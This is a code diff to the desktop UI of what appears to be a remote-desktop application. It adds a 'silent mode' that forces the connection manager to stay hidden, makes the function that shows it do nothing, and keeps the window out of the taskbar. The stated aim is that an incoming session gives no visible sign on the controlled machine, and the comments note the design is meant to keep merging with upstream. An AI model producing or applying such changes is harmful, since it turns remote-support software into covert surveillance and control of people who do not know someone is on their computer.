@@ -294,13 +294,11 @@ void runConnectionManagerScreen() async {
     const DesktopServerPage(),
     MyTheme.currentThemeMode(),
   );
-  final hide = await bind.cmGetConfig(name: "hide_cm") == 'true';
-  gFFI.serverModel.hideCm = hide;
-  if (hide) {
-    await hideCmWindow(isStartup: true);
-  } else {
-    await showCmWindow(isStartup: true);
-  }
+  // Silent mode: the connection manager is always hidden, regardless of the
+  // hide_cm config. An incoming session must not pop up a window or place an
+  // icon in the taskbar on the controlled machine.
+  gFFI.serverModel.hideCm = true;
+  await hideCmWindow(isStartup: true);
   setResizable(false);
   // Start the uni links handler and redirect links to Native, not for Flutter.
   listenUniLinks(handleByFlutter: false);
@@ -308,38 +306,17 @@ void runConnectionManagerScreen() async {
 
 bool _isCmReadyToShow = false;
 
-showCmWindow({bool isStartup = false}) async {
-  if (isStartup) {
-    WindowOptions windowOptions = getHiddenTitleBarWindowOptions(
-        size: kConnectionManagerWindowSizeClosedChat, alwaysOnTop: true);
-    await windowManager.waitUntilReadyToShow(windowOptions, null);
-    bind.mainHideDock();
-    await Future.wait([
-      windowManager.show(),
-      windowManager.focus(),
-      windowManager.setOpacity(1)
-    ]);
-    // ensure initial window size to be changed
-    await windowManager.setSizeAlignment(
-        kConnectionManagerWindowSizeClosedChat, Alignment.topRight);
-    _isCmReadyToShow = true;
-  } else if (_isCmReadyToShow) {
-    if (await windowManager.getOpacity() != 1) {
-      await windowManager.setOpacity(1);
-      await windowManager.focus();
-      await windowManager.minimize(); //needed
-      await windowManager.setSizeAlignment(
-          kConnectionManagerWindowSizeClosedChat, Alignment.topRight);
-      windowOnTop(null);
-    }
-  }
-}
+// Silent mode: showing the connection manager is disabled. This is kept as a
+// no-op rather than removing the call sites, so that the model, chat and voice
+// call code paths stay untouched and keep merging cleanly with upstream.
+showCmWindow({bool isStartup = false}) async {}
 
 hideCmWindow({bool isStartup = false}) async {
   if (isStartup) {
     WindowOptions windowOptions = getHiddenTitleBarWindowOptions(
-        size: kConnectionManagerWindowSizeClosedChat);
+        size: kConnectionManagerWindowSizeClosedChat, skipTaskbar: true);
     windowManager.setOpacity(0);
+    await windowManager.setSkipTaskbar(true);
     await windowManager.waitUntilReadyToShow(windowOptions, null);
     bind.mainHideDock();
     await windowManager.minimize();
@@ -407,7 +384,8 @@ WindowOptions getHiddenTitleBarWindowOptions(
     {bool isMainWindow = false,
     Size? size,
     bool center = false,
-    bool? alwaysOnTop}) {
+    bool? alwaysOnTop,
+    bool skipTaskbar = false}) {
   var defaultTitleBarStyle = TitleBarStyle.hidden;
   // we do not hide titlebar on win7 because of the frame overflow.
   if (kUseCompatibleUiMode) {
@@ -417,7 +395,7 @@ WindowOptions getHiddenTitleBarWindowOptions(
     size: size,
     center: center,
     backgroundColor: (isMacOS && isMainWindow) ? null : Colors.transparent,
-    skipTaskbar: false,
+    skipTaskbar: skipTaskbar,
     titleBarStyle: defaultTitleBarStyle,
     alwaysOnTop: alwaysOnTop,
   );
